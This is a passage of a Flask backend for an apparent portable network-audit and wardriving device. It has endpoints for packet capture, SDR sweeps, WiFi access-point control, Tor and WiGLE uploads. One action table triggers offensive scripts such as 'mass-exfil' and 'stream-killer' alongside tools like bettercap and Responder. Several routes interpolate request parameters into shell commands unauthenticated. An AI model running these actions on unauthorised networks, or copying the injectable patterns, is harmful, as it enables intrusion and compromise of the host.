    save  = request.args.get('save', 'false').lower() == 'true'
    session_id = f'pkt_{iface}'

    pcap = f'{TOOL_DIRS["tcpdump"]}/{stamp()}_{iface}_live.pcap' if save else None
    w = f'-w {pcap}' if pcap else ''
    # -l forces line-buffered output so we get packets as they arrive, not batched
    cmd = f'(tcpdump -l -i {iface} -n {w} 2>&1 || sudo tcpdump -l -i {iface} -n {w} 2>&1)'

    def gen():
        for chunk in sse_stream(session_id, cmd):
            yield chunk

    return Response(gen(), mimetype='text/event-stream',
                    headers={'Cache-Control': 'no-cache', 'X-Accel-Buffering': 'no'})

@app.route('/api/packets/live/stop', methods=['POST'])
def api_packets_live_stop():
    iface = request.json.get('iface', 'eth0') if request.is_json else request.args.get('iface', 'eth0')
    _stop_session(f'pkt_{iface}')
    return jsonify({'ok': True})

# -- Generic live log/tool feed (SSE) ----------------------------------

@app.route('/api/live/<feed_id>')
def api_live_feed(feed_id):
    if feed_id not in LIVE_LOG_FEEDS:
        return jsonify({'ok': False, 'error': f'Unknown feed: {feed_id}'}), 404
    cmd, _desc = LIVE_LOG_FEEDS[feed_id]
    session_id = f'log_{feed_id}'

    def gen():
        for chunk in sse_stream(session_id, cmd):
            yield chunk

    return Response(gen(), mimetype='text/event-stream',
                    headers={'Cache-Control': 'no-cache', 'X-Accel-Buffering': 'no'})

@app.route('/api/live/<feed_id>/stop', methods=['POST'])
def api_live_feed_stop(feed_id):
    _stop_session(f'log_{feed_id}')
    return jsonify({'ok': True})

@app.route('/api/live/feeds')
def api_live_feeds_list():
    return jsonify({'feeds': [{'id': k, 'desc': v[1]} for k, v in LIVE_LOG_FEEDS.items()]})

# -- SDR (NooElec NESDR Nano 3 / RTL-SDR) -----------------------------

# v8 handler kept for /api/remote/sdr; /api/sdr/status is served further down
def api_sdr_status():
    """Detect whether an RTL-SDR dongle is plugged in and responding."""
    try:
        r = subprocess.run('rtl_test -t 2>&1', shell=True, stdout=subprocess.PIPE,
                           stderr=subprocess.STDOUT, timeout=6)
        out = r.stdout.decode('utf-8', errors='replace')
        if 'No supported devices found' in out or 'usb_claim_interface error' in out:
            return jsonify({'ok': True, 'present': False, 'detail': out.strip()[:400]})
        if 'Found' in out and ('Nano' in out or 'RTL2838' in out or 'R820T' in out or 'Realtek' in out):
            m = re.search(r'Found \d+ device.*', out)
            return jsonify({'ok': True, 'present': True, 'detail': (m.group(0) if m else out.strip())[:400]})
        # rtl_test not installed at all
        if 'not found' in out.lower() or r.returncode != 0 and not out.strip():
            return jsonify({'ok': True, 'present': False, 'detail': 'rtl_test not available — rtl-sdr tools may not be installed'})
        return jsonify({'ok': True, 'present': 'Found' in out, 'detail': out.strip()[:400]})
    except subprocess.TimeoutExpired:
        return jsonify({'ok': True, 'present': False, 'detail': 'rtl_test timed out — device may be busy or unresponsive'})
    except FileNotFoundError:
        return jsonify({'ok': False, 'present': False, 'detail': 'rtl-sdr tools not installed (rtl_test missing)'})
    except Exception as e:
        return jsonify({'ok': False, 'present': False, 'detail': str(e)})

# v8 handler, no longer routed; /api/sdr/scan is served further down
def api_sdr_scan():
    """One-shot quick spectrum power scan over a frequency range using rtl_power."""
    body = request.json or {}
    f_start = body.get('start', '88M')
    f_stop  = body.get('stop',  '108M')
    bin_khz = body.get('bin',   '50k')
    out_csv = f'{TOOL_DIRS["sdr"]}/{stamp()}_sweep.csv'
    cmd = f'timeout 12 rtl_power -f {f_start}:{f_stop}:{bin_khz} -i 10 -1 "{out_csv}" 2>&1'
    log(f'SDR scan: {f_start}-{f_stop} step {bin_khz}')
    try:
        r = subprocess.run(cmd, shell=True, stdout=subprocess.PIPE,
                           stderr=subprocess.STDOUT, timeout=20)
        out = r.stdout.decode('utf-8', errors='replace')
        if os.path.exists(out_csv) and os.path.getsize(out_csv) > 0:
            log(f'✓ SDR scan saved → sdr/{os.path.basename(out_csv)}')
            return jsonify({'ok': True, 'saved': out_csv, 'output': out.strip()[-1500:]})
        log('✗ SDR scan produced no data')
        return jsonify({'ok': False, 'error': 'No data captured — is the dongle connected?',
                        'output': out.strip()[-1500:]})
    except subprocess.TimeoutExpired:
        return jsonify({'ok': False, 'error': 'Scan timed out'})
    except FileNotFoundError:
        return jsonify({'ok': False, 'error': 'rtl_power not installed'})
    except Exception as e:
        return jsonify({'ok': False, 'error': str(e)})

@app.route('/api/sdr/live')
def api_sdr_live():
    """Live-streaming power sweep via SSE, same pattern as packet/log feeds."""
    f_start = request.args.get('start', '88M')
    f_stop  = request.args.get('stop',  '108M')
    bin_khz = request.args.get('bin',   '100k')
    session_id = f'sdr_{f_start}_{f_stop}_{bin_khz}'
    cmd = f'rtl_power -f {f_start}:{f_stop}:{bin_khz} -i 2 - 2>&1'

    def gen():
        for chunk in sse_stream(session_id, cmd):
            yield chunk

    return Response(gen(), mimetype='text/event-stream',
                    headers={'Cache-Control': 'no-cache', 'X-Accel-Buffering': 'no'})

@app.route('/api/sdr/live/stop', methods=['POST'])
def api_sdr_live_stop():
    body = request.json or {}
    session_id = f'sdr_{body.get("start","88M")}_{body.get("stop","108M")}_{body.get("bin","100k")}'
    _stop_session(session_id)
    return jsonify({'ok': True})

# ── File tree ────────────────────────────────────────────────────────

@app.route('/api/files')
def api_files():
    """Captures tree grouped by tool. scope=current (this session) or
    previous (older than this session's start); default all."""
    scope = request.args.get('scope', 'all')
    tree = []
    for tool in sorted(TOOL_DIRS):
        d = TOOL_DIRS[tool]
        if not os.path.exists(d):
            continue
        files = []
        try:
            for f in sorted(os.listdir(d), reverse=True):
                fp  = os.path.join(d, f)
                if not os.path.isfile(fp): continue
                st  = os.stat(fp)
                # scope filter: current = modified since session start.
                if scope == 'current' and st.st_mtime < SESSION_START:
                    continue
                if scope == 'previous' and st.st_mtime >= SESSION_START:
                    continue
                ext = os.path.splitext(f)[1].lower()
                files.append({
                    'name':     f,
                    'path':     fp,
                    'size_kb':  round(st.st_size / 1024, 2),
                    'mtime':    datetime.fromtimestamp(st.st_mtime).strftime('%Y-%m-%d %H:%M'),
                    'type':     'pcap' if ext == '.pcap' else
                                'text' if ext in ('.log','.txt','.json','.csv') else 'binary',
                    'viewable': ext in ('.pcap','.log','.txt','.json','.csv')
                })
        except PermissionError:
            pass
        tree.append({
            'tool':  tool,
            'icon':  TOOL_ICONS.get(tool, '📁'),
            'dir':   d,
            'files': files,
            'count': len(files)
        })
    return jsonify({'tree': tree, 'base': CAPTURES_BASE})

@app.route('/api/files/delete', methods=['POST'])
@require_api_key
def api_file_delete():
    # Delete a capture/log file — only inside the captures dir (path-safe).
    body = request.json or {}
    path = body.get('path', '')
    if not os.path.abspath(path).startswith(os.path.abspath(CAPTURES_BASE)):
        return jsonify({'ok': False, 'error': 'Path outside captures directory'})
    if not os.path.isfile(path):
        return jsonify({'ok': False, 'error': 'Not a file'})
    try:
        os.remove(path)
        return jsonify({'ok': True})
    except Exception as e:
        return jsonify({'ok': False, 'error': str(e)})

@app.route('/api/files/download')
def api_file_download():
    from flask import send_file, abort
    path = request.args.get('path', '')
    # Same path-safety check as view: only inside the captures dir.
    if not os.path.abspath(path).startswith(os.path.abspath(CAPTURES_BASE)):
        abort(403)
    if not os.path.isfile(path):
        abort(404)
    return send_file(path, as_attachment=True,
                     download_name=os.path.basename(path))

@app.route('/api/files/open')
def api_file_open():
    """Serve a file inline so the browser displays it in a new tab.
    Text/log/json/csv render as plain text; pcap is decoded to text."""
    from flask import Response, abort
    path = request.args.get('path', '')
    if not os.path.abspath(path).startswith(os.path.abspath(CAPTURES_BASE)):
        abort(403)
    if not os.path.isfile(path):
        abort(404)
    ext = os.path.splitext(path)[1].lower()
    try:
        if ext == '.pcap':
            r = subprocess.run(
                f'tcpdump -r "{path}" -n 2>&1 | head -1000 || '
                f'sudo tcpdump -r "{path}" -n 2>&1 | head -1000',
                shell=True, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, timeout=15)
            body = r.stdout.decode('utf-8', errors='replace')
        else:
            with open(path, 'r', errors='replace') as f:
                body = f.read()
        return Response(body, mimetype='text/plain; charset=utf-8')
    except Exception as e:
        return Response('Could not open file: ' + str(e),
                        mimetype='text/plain', status=500)

@app.route('/api/files/view')
def api_file_view():
    path = request.args.get('path', '')
    if not os.path.abspath(path).startswith(os.path.abspath(CAPTURES_BASE)):
        return jsonify({'ok': False, 'error': 'Path outside captures directory'})
    if not os.path.isfile(path):
        return jsonify({'ok': False, 'error': 'File not found'})
    ext = os.path.splitext(path)[1].lower()
    try:
        if ext == '.pcap':
            r = subprocess.run(
                f'tcpdump -r "{path}" -n 2>&1 | head -500 || '
                f'sudo tcpdump -r "{path}" -n 2>&1 | head -500',
                shell=True, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, timeout=10)
            return jsonify({'ok': True,
                            'content': r.stdout.decode('utf-8', errors='replace'),
                            'type': 'pcap'})
        with open(path, 'r', errors='replace') as f:
            content = f.read(100_000)
        return jsonify({'ok': True, 'content': content, 'type': 'text'})
    except Exception as e:
        return jsonify({'ok': False, 'error': str(e)})

# ── Tool actions ─────────────────────────────────────────────────────

def api_run_internal(action, target=None):
    sd = script_dir()
    st = stamp()
    td = TOOL_DIRS

    # OSINT lookups that take a host/IP/domain (Pager/PicoCalc send it as "target")
    import re as _re, shlex as _shlex
    targeted = {
        'whois':      ('whois {t}',                                      'WHOIS'),
        'dig':        ('dig +short {t} ANY 2>&1 | head -30',             'DNS records'),
        'traceroute': ('traceroute -w2 -q1 -m15 {t} 2>&1 | head -25',    'Traceroute'),
        'geoip-ip':   ('curl -s --max-time 6 http://ip-api.com/json/{t}','GeoIP lookup'),
    }
    if action in targeted:
        t = (target or '').strip()
        if not _re.fullmatch(r'[A-Za-z0-9._:-]{1,120}', t):
            return jsonify({'ok': False, 'error': 'Provide a valid host / IP / domain'})
        cmd, desc = targeted[action]
        return jsonify(run_cmd(cmd.format(t=_shlex.quote(t)), desc, timeout=20))

    actions = {
        # v1
        'port-term':       (f'bash {sd}/port-terminator.sh',   'Port Terminator',  f'{td["logs"]}/{st}_port-terminator.log'),
        'stream-kill':     (f'bash {sd}/stream-killer.sh',     'Stream Killer',    f'{td["logs"]}/{st}_stream-killer.log'),
        'mass-exfil':      (f'bash {sd}/mass-exfil.sh',       'Mass Exfil',       f'{td["exfil"]}/{st}_mass-exfil.log'),
        'isolate':         (f'bash {sd}/isolate-regex.sh',     'Isolate Regex',    f'{td["bettercap"]}/{st}_isolate.log'),
        'bettercap-ver':   ('bettercap --version',             'Bettercap Ver',    None),
        'nmap-scan':       ('nmap -sn 10.0.0.0/24',           'LAN Scan',         f'{td["nmap"]}/{st}_lan-scan.txt'),
        # v2
        'suricata-start':  ('sudo systemctl start suricata',   'Start Suricata',   None),
        'suricata-stop':   ('sudo systemctl stop suricata',    'Stop Suricata',    None),
        'suricata-status': ('sudo systemctl status suricata --no-pager -l', 'Suricata Status', None),
        'clamav-scan':     ('sudo clamscan -r /home --bell -i','ClamAV Scan',      f'{td["clamav"]}/{st}_scan.log'),
        'zeek-check':      ('zeek --version',                  'Zeek Check',       None),
        # v3
        'mitmproxy-ver':   ('mitmproxy --version',             'mitmproxy',        None),
        'responder-check': ('which Responder.py 2>&1 && echo Ready || echo "not in PATH"', 'Responder', None),
        'hostapd-check':   ('hostapd -v 2>&1 | head -3',      'hostapd',          None),
        # v4
        'hashcat':         ('hashcat --version',               'hashcat',          None),
        'yara':            ('yara --version',                  'YARA',             None),
        'aircrack':        ('aircrack-ng --version 2>&1|head -5','aircrack-ng',    None),
        'snort':           ('snort --version 2>&1|head -5',   'Snort',            None),
        # OSINT
        'myip':       ('curl -s --max-time 5 https://api.ipify.org?format=json', 'External IP',  f'{td["logs"]}/{st}_myip.log'),
        'geoip':      ('curl -s --max-time 6 http://ip-api.com/json/',          'GeoIP (self)', f'{td["logs"]}/{st}_geoip.log'),
        'dns-test':   ('nslookup google.com 8.8.8.8 2>&1|head -10',            'DNS Test',     None),
        'arp-table':  ('arp -n',                                                 'ARP Table',    f'{td["nmap"]}/{st}_arp.txt'),
        'ports':      ('ss -tulpn',                                              'Active Ports', None),
        'routes':     ('ip route',                                               'Routes',       None),
        'wifi-scan':  ('nmcli -f SSID,CHAN,SIGNAL,SECURITY device wifi list','WiFi Scan', f'{td["aircrack"]}/{st}_wifi-scan.txt'),
        # Tor (SOCKS proxy on 127.0.0.1:9050)
        'tor-status':  ('systemctl is-active tor && systemctl status tor --no-pager -l | head -6', 'Tor Status', None),
        'tor-start':   ('sudo systemctl start tor && sleep 1 && systemctl is-active tor', 'Tor Start', None),
        'tor-stop':    ('sudo systemctl stop tor && systemctl is-active tor; true', 'Tor Stop', None),
        'tor-ip':      ('curl -s --max-time 15 --socks5 127.0.0.1:9050 https://check.torproject.org/api/ip', 'Tor Exit IP', f'{td["logs"]}/{st}_tor-ip.log'),
        'tor-newid':   ('sudo pkill -HUP tor && sleep 3 && curl -s --max-time 15 --socks5 127.0.0.1:9050 https://check.torproject.org/api/ip', 'Tor New Identity', None),
        'myip-real':   ('curl -s --max-time 5 https://check.torproject.org/api/ip', 'Real Exit IP (no Tor)', None),
    }
    if action in actions:
        cmd, desc, save = actions[action]
        return jsonify(run_cmd(cmd, desc, save_to=save))
    return jsonify({'ok': False, 'error': f'Unknown action: {action}'})

@app.route('/api/run', methods=['POST'])
def api_run():
    action = request.json.get('action', '')
    return api_run_internal(action, request.json.get('target'))

@app.route('/api/reboot', methods=['POST'])
def api_reboot():
    log('Reboot requested')
    subprocess.Popen('sleep 2 && sudo reboot', shell=True)
    return jsonify({'ok': True})


# ── Status + log feeds for the right-hand panel ──────────────────────

def _sdr_present():
    """RTL2832U dongles (incl. the NooElec Nano 3) enumerate as 0bda:2832/2838."""
    import glob as _glob
    for d in _glob.glob('/sys/bus/usb/devices/*'):
        try:
            with open(d + '/idVendor') as f:
                vid = f.read().strip()
            with open(d + '/idProduct') as f:
                pid = f.read().strip()
        except OSError:
            continue
        if vid == '0bda' and pid in ('2832', '2838'):
            return True
    return False

def _read_file(path):
    try:
        with open(path) as f:
            return f.read().strip()
    except OSError:
        return ''

@app.route('/api/status')
def api_status():
    up = _read_file('/proc/uptime').split()
    secs = int(float(up[0])) if up else 0
    d, rem = divmod(secs, 86400)
    h, rem = divmod(rem, 3600)
    uptime = (f'{d}d {h}h' if d else f'{h}h {rem // 60}m') if secs else '—'
    t = _read_file('/sys/class/thermal/thermal_zone0/temp')
    temp = f'{int(t) / 1000:.1f}°C' if t.isdigit() else '—'
    ip = '—'
    try:
        r = subprocess.run(['ip', '-4', 'route', 'get', '1.1.1.1'],
                           capture_output=True, text=True, timeout=2)
        m = re.search(r'dev (\S+).*?src (\S+)', r.stdout)
        if m:
            ip = f'{m.group(2)} ({m.group(1)})'
    except Exception:
        pass
    return jsonify({
        'cpu':    psutil.cpu_percent(None),
        'ram':    psutil.virtual_memory().percent,
        'disk':   psutil.disk_usage('/').percent,
        'ip':     ip,
        'uptime': uptime,
        'temp':   temp,
        'sdr':    _sdr_present(),
        'portapack': _pp_mode()['mode'],
        'flipper': _fz_link_kind(),
        'log':    activity_log[::-1][:15],
    })

@app.route('/api/log')
def api_log():
    return jsonify({'log': activity_log[::-1][:50]})


# ── WiFi: USB adapter as client uplink + tunnel-rat AP (NetworkManager) ──
# The onboard card runs the AP; the first other WiFi device (e.g. the TP-Link)
# is the uplink. Override with TR_AP_IFACE / TR_AP_CON / TR_UPLINK_IFACE.

AP_IFACE = os.environ.get('TR_AP_IFACE', 'wlp1s0')
AP_CON   = os.environ.get('TR_AP_CON', 'tunnel-rat-ap')

def _nm(args, timeout=20):
    r = subprocess.run(['nmcli'] + args, stdout=subprocess.PIPE,
                       stderr=subprocess.PIPE, timeout=timeout)
    return (r.returncode, r.stdout.decode('utf-8', errors='replace'),
            r.stderr.decode('utf-8', errors='replace'))

def _nm_split(line):
    """Split one line of `nmcli -t` output on unescaped colons."""
    parts, cur, esc = [], '', False
    for ch in line:
        if esc:
            cur += ch
            esc = False
        elif ch == '\\':
            esc = True
        elif ch == ':':
            parts.append(cur)
            cur = ''
        else:
            cur += ch
    parts.append(cur)
    return parts

def _nm_fields(args):
    """`nmcli -t` detail query -> {field: first value}."""
    rc, o, _ = _nm(['-t'] + args)
    out = {}
    if rc != 0:
        return out
    for line in o.splitlines():
        k, _, v = line.partition(':')
        k = re.sub(r'\[\d+\]$', '', k)
        out.setdefault(k, v.replace('\\:', ':'))
    return out

def uplink_iface():
    env = os.environ.get('TR_UPLINK_IFACE')
    if env:
        return env
    rc, o, _ = _nm(['-t', '-f', 'DEVICE,TYPE', 'device'])
    for line in o.splitlines():
        p = _nm_split(line)
        if len(p) >= 2 and p[1] == 'wifi' and p[0] != AP_IFACE:
            return p[0]
    return None

def _saved_wifi():
    """Saved client WiFi profiles (the AP profile is excluded)."""
    rc, o, _ = _nm(['-t', '-f', 'NAME,TYPE', 'connection', 'show'])
    saved = []
    for line in o.splitlines():
        p = _nm_split(line)
        if len(p) < 2 or p[1] not in ('802-11-wireless', 'wifi') or p[0] == AP_CON:
            continue
        f = _nm_fields(['-f', '802-11-wireless.ssid,802-11-wireless.mode',
                        'connection', 'show', p[0]])
        if f.get('802-11-wireless.mode') == 'ap':
            continue
        saved.append({'name': p[0], 'ssid': f.get('802-11-wireless.ssid') or p[0]})
    return saved

def _default_dev():
    try:
        r = subprocess.run(['ip', '-4', 'route', 'show', 'default'],
                           capture_output=True, text=True, timeout=3)
        m = re.search(r'\bdev (\S+)', r.stdout)
        return m.group(1) if m else None
    except Exception:
        return None

def _ap_clients():
    leases = {}
    # hostapd setup uses the system dnsmasq lease file; fall back to the
    # NetworkManager-managed one if the AP is ever run via nmcli instead.
    lease_text = _read_file('/var/lib/misc/dnsmasq.leases')
    if not lease_text.strip():
        lease_text = _read_file(f'/var/lib/NetworkManager/dnsmasq-{AP_IFACE}.leases')
    for line in lease_text.splitlines():
        p = line.split()
        if len(p) >= 4:
            leases[p[1].lower()] = {'ip': p[2], 'host': '' if p[3] == '*' else p[3]}
    clients = []
    try:
        r = subprocess.run(['iw', 'dev', AP_IFACE, 'station', 'dump'],
                           capture_output=True, text=True, timeout=3)
        for line in r.stdout.splitlines():
            s = line.strip()
            m = re.match(r'Station ([0-9a-fA-F:]{17})', s)
            if m:
                mac = m.group(1).lower()
                c = {'mac': mac, 'signal': None, 'ip': '', 'host': ''}
                c.update(leases.get(mac, {}))
                clients.append(c)
            elif clients and s.startswith('signal:'):
                sig = re.search(r'(-?\d+)', s)
                if sig:
                    clients[-1]['signal'] = int(sig.group(1))
    except Exception:
        pass
    return clients

def _nm_error(fn):
    from functools import wraps
    @wraps(fn)
    def wrapper(*a, **kw):
        try:
            return fn(*a, **kw)
        except FileNotFoundError as e:
            return jsonify({'ok': False, 'error': f'{e.filename or "nmcli"} not found — apt install network-manager'})
        except subprocess.TimeoutExpired:
            return jsonify({'ok': False, 'error': 'Timed out waiting for NetworkManager'})
    return wrapper

HOSTAPD_CONF = os.environ.get('TR_HOSTAPD_CONF', '/etc/hostapd/hostapd.conf')

def _hostapd_conf():
    """Parse the key=value hostapd.conf into a dict (empty if absent)."""
    conf = {}
    for line in _read_file(HOSTAPD_CONF).splitlines():
        line = line.strip()
        if not line or line.startswith('#') or '=' not in line:
            continue
        k, _, v = line.partition('=')
        conf[k.strip()] = v.strip()
    return conf

def _svc_active(name):
    try:
        r = subprocess.run(['systemctl', 'is-active', name],
                           capture_output=True, text=True, timeout=4)
        return r.stdout.strip() == 'active'
    except Exception:
        return False

def _ap_status():
    """AP status, preferring hostapd; falls back to a NetworkManager AP profile."""
    conf = _hostapd_conf()
    if conf:
        iface = conf.get('interface', AP_IFACE)
        ip = ''
        try:
            r = subprocess.run(['ip', '-4', '-o', 'addr', 'show', 'dev', iface],
                               capture_output=True, text=True, timeout=3)
            m = re.search(r'inet (\d+\.\d+\.\d+\.\d+)', r.stdout)
            ip = m.group(1) if m else ''
        except Exception:
            pass
        return {'con': 'hostapd', 'iface': iface, 'exists': True,
                'active': _svc_active('hostapd'),
                'ssid': conf.get('ssid', ''), 'ip': ip, 'backend': 'hostapd'}
    # Fallback: NetworkManager-managed AP profile
    rc, o, _ = _nm(['-t', '-f', 'NAME', 'connection', 'show', '--active'])
    ap_active = any(_nm_split(l)[0] == AP_CON for l in o.splitlines())
    apf = _nm_fields(['-f', '802-11-wireless.ssid,ipv4.addresses', 'connection', 'show', AP_CON])
    return {'con': AP_CON, 'iface': AP_IFACE, 'exists': bool(apf), 'active': ap_active,
            'ssid': apf.get('802-11-wireless.ssid', ''),
            'ip': apf.get('ipv4.addresses', '').split('/')[0], 'backend': 'networkmanager'}

@app.route('/api/wifi/status')
@_nm_error
def wifi_status():
    iface = uplink_iface()
    up = {'iface': iface, 'connected': False}
    if iface:
        f = _nm_fields(['-f', 'GENERAL.STATE,GENERAL.CONNECTION,IP4.ADDRESS', 'device', 'show', iface])
        up['connected']  = f.get('GENERAL.STATE', '').startswith('100')
        up['connection'] = f.get('GENERAL.CONNECTION', '')
        up['ip']         = f.get('IP4.ADDRESS', '').split('/')[0]
        rc, o, _ = _nm(['-t', '-f', 'IN-USE,SSID,SIGNAL', 'device', 'wifi', 'list',
                        '--rescan', 'no', 'ifname', iface])
        for line in o.splitlines():
            p = _nm_split(line)
            if len(p) >= 3 and p[0] == '*':
                up['ssid'] = p[1]
                up['signal'] = int(p[2]) if p[2].isdigit() else None
                break
    ap = _ap_status()
    ap['clients'] = _ap_clients() if ap['active'] else []
    return jsonify({'ok': True, 'uplink': up, 'ap': ap,
                    'default_dev': _default_dev(), 'saved': _saved_wifi()})

@app.route('/api/adapters')
def api_adapters():
    """List WiFi interfaces so the user can pick which adapter tools use."""
    out = []
    try:
        for dev in sorted(os.listdir('/sys/class/net')):
            if not os.path.exists(f'/sys/class/net/{dev}/phy80211'):
                continue
            # is it the AP card, or a usable adapter?
            role = 'AP (onboard)' if dev == 'wlp1s0' else 'adapter'
            # does it have an IP (is it connected)?
            ip = ''
            try:
                r = subprocess.run(f"ip -4 -o addr show dev {dev}", shell=True,
                                   stdout=subprocess.PIPE, timeout=3)
                import re as _re
                m = _re.search(r'inet (\d+\.\d+\.\d+\.\d+)', r.stdout.decode())
                if m: ip = m.group(1)
            except Exception:
                pass
            out.append({'iface': dev, 'role': role, 'ip': ip})
    except Exception:
        pass
    return jsonify({'adapters': out})

WIGLE_CRED_FILE = '/opt/tunnel-rat/wigle-creds.json'

@app.route('/api/wigle/creds', methods=['GET', 'POST'])
@require_api_key
def api_wigle_creds():
    import json as _json
    if request.method == 'POST':
        body = request.json or {}
        name = (body.get('api_name') or '').strip()
        token = (body.get('api_token') or '').strip()
        try:
            with open(WIGLE_CRED_FILE, 'w') as f:
                _json.dump({'api_name': name, 'api_token': token}, f)
            os.chmod(WIGLE_CRED_FILE, 0o600)
            return jsonify({'ok': True})
        except Exception as e:
            return jsonify({'ok': False, 'error': str(e)})
    # GET — report whether creds are saved (never return the token itself)
    try:
        with open(WIGLE_CRED_FILE) as f:
            c = _json.load(f)
        return jsonify({'ok': True, 'saved': bool(c.get('api_token')),
                        'api_name': c.get('api_name', '')})
    except Exception:
        return jsonify({'ok': True, 'saved': False, 'api_name': ''})

@app.route('/api/wigle/upload', methods=['POST'])
@require_api_key
def api_wigle_upload():
    import json as _json
    body = request.json or {}
    path = body.get('path', '')
    if not os.path.abspath(path).startswith(os.path.abspath(f'{CAPTURES_BASE}/wardrive')):
        return jsonify({'ok': False, 'error': 'Not a wardrive file'})
    if not os.path.isfile(path):
        return jsonify({'ok': False, 'error': 'File not found'})
    try:
        with open(WIGLE_CRED_FILE) as f:
            c = _json.load(f)
        name, token = c.get('api_name', ''), c.get('api_token', '')
    except Exception:
        return jsonify({'ok': False, 'error': 'No WiGLE credentials saved — add them first.'})
    if not token:
        return jsonify({'ok': False, 'error': 'No WiGLE API token saved.'})
    # Upload via WiGLE's API using curl (handles multipart + auth cleanly).
    # Auth is HTTP Basic with api_name:api_token.
    try:
        r = subprocess.run(
            ['curl', '-s', '--max-time', '120', '-u', f'{name}:{token}',
             '-F', f'file=@{path}', 'https://api.wigle.net/api/v2/file/upload'],
            stdout=subprocess.PIPE, stderr=subprocess.STDOUT, timeout=130)
        resp = r.stdout.decode('utf-8', 'replace')
        # WiGLE returns JSON; success has "success":true
        if '"success":true' in resp or '"success": true' in resp:
            return jsonify({'ok': True, 'response': resp[:500]})
        return jsonify({'ok': False, 'error': 'WiGLE rejected the upload',
                        'response': resp[:500]})
    except Exception as e:
        return jsonify({'ok': False, 'error': str(e)})

@app.route('/api/wardrive/files')
def api_wardrive_files():
    """List saved wardrive CSVs (for the WARDRIVE tab dropdown)."""
    out = []
    d = f'{CAPTURES_BASE}/wardrive'
    try:
        for f in sorted(glob.glob(f'{d}/*.csv'), reverse=True):
            st = os.stat(f)
            # count data rows (minus the 2 header lines)
            try:
                with open(f) as fh:
                    n = max(0, sum(1 for _ in fh) - 2)
            except Exception:
                n = 0
            out.append({'name': os.path.basename(f), 'path': f,
                        'size_kb': round(st.st_size/1024, 1),
                        'rows': n,
                        'mtime': datetime.fromtimestamp(st.st_mtime).strftime('%Y-%m-%d %H:%M')})
    except Exception:
        pass
    return jsonify({'files': out, 'dir': d})

@app.route('/api/wardrive')
def api_wardrive():
    """Return nearby networks (SSID, BSSID/MAC, signal, channel) with the
    encounter count from the sightings DB, for the wardriving tab."""
    import subprocess as _sp
    nets = []
    # Load sightings counts (mac -> count) if the tracker has run.
    counts = {}
    db = f'{CAPTURES_BASE}/logs/sightings.db'
    try:
        with open(db) as f:
            for line in f:
                p = line.strip().split('|')
                if len(p) >= 2:
                    counts[p[0].lower()] = p[1]
    except Exception:
        pass
    try:
        r = _sp.run('nmcli -t -f BSSID,SSID,SIGNAL,CHAN device wifi list --rescan yes',
                    shell=True, stdout=_sp.PIPE, stderr=_sp.DEVNULL, timeout=25)
        for line in r.stdout.decode('utf-8', 'replace').splitlines():
            # nmcli escapes colons in the BSSID as \: — rejoin them.
            line = line.replace('\\:', '§')
            parts = line.split(':')
            if len(parts) < 4:
                continue
            mac = parts[0].replace('§', ':').lower()
            ssid = parts[1].replace('§', ':')
            signal = parts[2]
            chan = parts[3]
            nets.append({'mac': mac, 'ssid': ssid or '(hidden)',
                         'signal': signal, 'chan': chan,
                         'count': counts.get(mac, '1')})
    except Exception as e:
        return jsonify({'ok': False, 'error': str(e), 'nets': []})
    # strongest first
    try:
        nets.sort(key=lambda n: -int(n['signal']))
    except Exception:
        pass
    return jsonify({'ok': True, 'nets': nets, 'count': len(nets)})

@app.route('/api/wifi/scan')
@_nm_error
def wifi_scan():
    iface = uplink_iface()
    if not iface:
        return jsonify({'ok': False, 'error': 'No USB WiFi adapter found for the uplink'})
    fields = ['-t', '-f', 'IN-USE,SSID,CHAN,SIGNAL,SECURITY', 'device', 'wifi', 'list']
    rc, o, e = _nm(fields + ['--rescan', 'yes', 'ifname', iface], timeout=30)
    if rc != 0:   # e.g. "scanning not allowed" right after a previous scan
        rc, o, e = _nm(fields + ['--rescan', 'auto', 'ifname', iface], timeout=30)
    if rc != 0:
        return jsonify({'ok': False, 'error': (e or o).strip() or 'Scan failed'})
    own = _nm_fields(['-f', '802-11-wireless.ssid', 'connection', 'show', AP_CON]).get('802-11-wireless.ssid')
    saved = {s['ssid'] for s in _saved_wifi()}
    nets = {}
    for line in o.splitlines():
        p = _nm_split(line)
        if len(p) < 5:
            continue
        in_use, ssid, chan, sig, sec = p[0] == '*', p[1], p[2], p[3], p[4]
        if not ssid or ssid == '--' or ssid == own:   # skip hidden + our own AP
            continue
        sig = int(sig) if sig.isdigit() else 0
        n = nets.setdefault(ssid, {'ssid': ssid, 'signal': -1, 'in_use': False, 'channels': []})
        n['in_use'] = n['in_use'] or in_use
        if chan and chan not in n['channels']:
            n['channels'].append(chan)
        if sig > n['signal']:
            n['signal'] = sig
            n['security'] = '' if sec in ('', '--') else sec
            n['secure'] = sec not in ('', '--')
        n['saved'] = ssid in saved
    out = sorted(nets.values(), key=lambda n: (not n['in_use'], -n['signal']))
    return jsonify({'ok': True, 'iface': iface, 'networks': out})

@app.route('/api/wifi/connect', methods=['POST'])
@_nm_error
def wifi_connect():
    body = request.json or {}
    ssid = (body.get('ssid') or '').strip()
    pw = body.get('password') or ''
    iface = uplink_iface()
    if not iface:
        return jsonify({'ok': False, 'error': 'No USB WiFi adapter found for the uplink'})
    if not ssid:
        return jsonify({'ok': False, 'error': 'No network selected'})
    if ssid == _nm_fields(['-f', '802-11-wireless.ssid', 'connection', 'show', AP_CON]).get('802-11-wireless.ssid'):
        return jsonify({'ok': False, 'error': "That's this device's own AP"})
    match = next((s for s in _saved_wifi() if s['ssid'] == ssid), None)
    if match:
        if pw:   # update the saved password instead of creating a duplicate profile
            _nm(['connection', 'modify', match['name'], 'wifi-sec.key-mgmt', 'wpa-psk', 'wifi-sec.psk', pw])
        rc, o, e = _nm(['connection', 'up', match['name'], 'ifname', iface], timeout=60)
    else:
        args = ['device', 'wifi', 'connect', ssid] + (['password', pw] if pw else []) + ['ifname', iface]
        rc, o, e = _nm(args, timeout=60)
    if rc != 0:
        err = (e or o).strip()
        if not match:   # don't leave a half-made profile autoconnecting with a bad password
            for s in _saved_wifi():
                if s['ssid'] == ssid:
                    _nm(['connection', 'delete', s['name']])
        if 'Secrets were required' in err:
            err = 'Wrong or missing password'
        elif '802-11-wireless-security.psk' in err:
            err = 'WiFi passwords are 8-63 characters'
        log(f'✗ WiFi uplink: could not join {ssid}')
        return jsonify({'ok': False, 'error': err or 'Connection failed'})
    # Pin the profile to the uplink so the AP card never tries to join it as a client
    name = _nm_fields(['-f', 'GENERAL.CONNECTION', 'device', 'show', iface]).get('GENERAL.CONNECTION')
